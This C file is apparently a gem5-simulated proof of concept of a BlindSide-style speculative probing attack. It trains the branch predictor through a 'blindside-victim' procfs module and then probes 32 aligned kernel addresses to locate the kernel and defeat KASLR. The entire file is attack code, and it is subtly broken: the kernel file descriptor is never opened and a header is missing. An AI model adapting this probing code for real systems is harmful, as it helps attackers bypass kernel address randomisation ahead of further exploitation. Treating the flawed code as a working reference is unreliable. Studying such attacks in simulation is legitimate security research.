//
// Created by shixinsong on 10/6/23.
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/syscall.h>
#include "m5ops.h"

#define PROCFS_NAME "blindside-victim"
#define NUM_TRAIN 5

#define START_KERNEL 0xffffffff80000000
#define ALIGN 0x2000000
#define NUM_OFFSETS 32


typedef struct blindside_command_t {
    unsigned long f_ptr;
    unsigned long idx;
} blindside_command;


static inline void call_kernel(int kernel_fd, uint64_t test_addr, uint64_t idx) {
    blindside_command local_cmd;
    local_cmd.f_ptr = test_addr;
    local_cmd.idx = idx;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}


void test_one_address(int kernel_fd, size_t test_addr, size_t round) {
    uint64_t i;

    // Train the branch predictor
    for (i = 0; i < NUM_TRAIN; i++) {
        call_kernel(kernel_fd, 0, i);
    }

    // Start Probing
    printf("Test addr: %lx\n", test_addr);
    m5_reset_stats(0, 0);
    m5_work_begin(round, 0);
    call_kernel(kernel_fd, test_addr, NUM_TRAIN);
    m5_work_end(round, 0);
    // End Probing
}

int main() {
    uint64_t i;
    int kernel_fd;

    for (i = 0; i < NUM_OFFSETS; i++) {
        test_one_address(kernel_fd, START_KERNEL + i * ALIGN, i);
    }
}
